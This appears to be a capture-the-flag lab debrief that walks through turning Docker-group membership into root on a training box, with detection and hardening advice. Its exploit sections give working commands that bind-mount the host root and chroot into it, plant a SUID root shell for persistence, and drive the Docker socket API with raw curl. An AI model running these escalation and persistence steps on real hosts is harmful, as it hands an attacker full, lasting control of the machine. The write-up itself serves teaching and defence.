# Chapter 08 — "Docker socket" · Debrief

> Full walkthrough for `hollow-forge-01` (`target-docker`). Membership of the
> `docker` group turned into root three different ways. Try the box with
> [README.md](README.md) first.

**Flag:** `/root/flag.txt` → `R2R{the_d0cker_socket_is_root_equ1valent}`

---

## The one idea

The Docker daemon runs as **root**, and it exposes a control API over the unix
socket `/var/run/docker.sock`. The API has no privilege separation worth the
name: anyone who can talk to the socket can ask the root daemon to create a
container, and containers can **bind-mount any host path** (`-v /:/host`) and run
as root. So the socket is a root-equivalent capability. The `docker` group
exists only to grant access to that socket — which is why *"just add them to the
`docker` group"* is the same as *"give them root."* The official docs say so in
as many words.

No exploit, no CVE, no kernel bug. This is design-as-intended power, handed to
the wrong user.

**Recon that finds it:**

```bash
id                                  # groups=...,docker
ls -l /var/run/docker.sock          # srw-rw---- 1 root docker
docker info                         # you can drive the root daemon
```

> **Lab note:** this box runs its own inner daemon (docker-in-docker, `vfs`
> storage driver) so the filesystem you mount is *this* container — that's where
> the flag is. On a real host, `-v /:/host` mounts the **real host**, and you
> own the machine the containers run on, not just one container.

---

## Station A — mount + chroot → read  ·  ★★☆☆

### 1. Recon → 2. flaw
`id` shows `docker`; the socket is group-writable. The daemon is root, so a
container that mounts `/` reads anything.

### 3. Exploit
```bash
docker run --rm -v /:/host rtr/bb chroot /host cat /root/flag.txt
# R2R{...}
```

### 4. Why it works
`-v /:/host` bind-mounts the host root into the new container at `/host`. The
container's process is root (default), and bind mounts preserve the host's
inode permissions *but the container root bypasses them*, so `chroot /host`
lands you on the host filesystem as uid 0. `rtr/bb` is a `FROM scratch` image
with a static busybox providing `chroot`; `cat` is the host's, found after the
chroot. The box is airgapped, so the lab bakes `rtr/bb` instead of pulling
`alpine` — on a connected host you'd just `docker run -v /:/mnt alpine …`.

### 5. Detect / 6. Harden → shared below.

---

## Station B — persistent root  ·  ★★★☆

### 1–2. Recon → flaw
A container is ephemeral; the moment it exits your shell is gone. Use the mount
to leave a root foothold on the host itself.

### 3. Exploit
```bash
docker run --rm -v /:/host rtr/bb chroot /host \
  sh -c 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash'
/tmp/rootbash -p -c 'id; cat /root/flag.txt'     # euid=0
```
Equally: append your key to `/root/.ssh/authorized_keys`, add a NOPASSWD
sudoers rule, or drop a cron job — all through the same mount, all as root.

### 4. Why it works
The write happens as root on the host filesystem, so the SUID bit sticks and is
owned by root. `bash -p` keeps the elevated euid instead of dropping it. You've
converted a one-shot container into a durable root primitive that survives the
container exiting.

### 5. Detect / 6. Harden → shared below.

---

## Station C — the raw socket, no docker client  ·  ★★★☆

### 1–2. Recon → flaw
The `docker` CLI is just an HTTP client speaking to the socket. If a box has the
socket but no `docker` binary (common when `docker.sock` is mounted into some
*other* container, e.g. a CI runner or a Portainer agent), `curl` is enough.

### 3. Exploit
```bash
CID=$(curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"rtr/bb","Cmd":["chroot","/host","cat","/root/flag.txt"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create | jq -r .Id)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/wait
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=1" | tr -cd '[:print:]\n'
```

### 4. Why it works
`POST /containers/create` with `HostConfig.Binds: ["/:/host"]` is the API form of
`-v /:/host`; `start` runs it; `logs` streams the output (8-byte frame headers,
stripped with `tr`). This is the version that matters in the real world: a
**mounted** `docker.sock` inside an app container is a full host takeover from
that app, even though the app image ships no docker tooling.

### 5. Detect / 6. Harden → shared below.

---

## Detect (all stations)

```bash
# who can reach the socket:
ls -l /var/run/docker.sock ; getent group docker
# containers started with the host root mounted — the smoking gun:
docker ps --format '{{.ID}} {{.Image}} {{.Mounts}}' | grep -E '(^| )/( |$)'
# audit socket access and privileged/host-mount container creation:
auditctl -w /var/run/docker.sock -p rw -k docker_sock
# a container with Binds "/:/..." or HostConfig.Privileged=true in daemon logs
```

## Harden (all stations)

- **Treat `docker` group membership as granting root.** Don't add users to it
  casually; audit who's in it (`getent group docker`).
- **Never mount `/var/run/docker.sock` into a container** you don't fully trust.
  If a workload needs the API, put a filtering proxy in front
  (`docker-socket-proxy`) that allows only the endpoints it needs — never
  `containers/create` with arbitrary binds.
- **Rootless Docker** or **Podman (rootless)** removes the root daemon entirely,
  so socket access no longer means host root.
- **Restrict the API**: no unauthenticated TCP (`-H tcp://` without TLS/mTLS),
  enable user namespaces (`userns-remap`) so container root ≠ host root.
- **Defence in depth:** seccomp/AppArmor profiles and dropped capabilities limit
  what a container can do even if it starts — but they don't save you once an
  attacker can request arbitrary mounts, so the socket access is the real fix.

## Real world
This is one of the most common "I have a shell, now what" escalations on CI/CD
and container hosts, and the single most dangerous thing you can mount into a
container. Kubernetes nodes, Jenkins agents, GitLab runners, and Portainer
deployments are repeatedly compromised through an exposed or mounted
`docker.sock`. It's in GTFOBins-adjacent cheatsheets, HackTricks, and nearly
every container-security course — because it is intended behaviour, which means
it never gets "patched," only configured away.

---

## Clean up / reset

Station B leaves `/tmp/rootbash` and may leave stopped containers behind:

```bash
make reset-docker
# or:
docker compose up -d --build --force-recreate target-docker
```

## What you learned

- **`docker` group = root.** The daemon is root and the socket is its control
  plane; access is the privilege.
- **`-v /:/host` + chroot** is the whole technique — read, write, or persist.
- **The CLI is optional** — the socket's HTTP API (reachable with `curl`) is the
  real attack surface, which is why a *mounted* `docker.sock` is catastrophic.
- **The fix is configuration, not a patch:** rootless runtimes, a socket proxy,
  userns-remap, and not handing out `docker` group membership.

Recipes are collected in the
[Blue-Team Playbook](https://github.com/Adw0rm-sec/road-to-root/wiki/Blue-Team-Playbook).
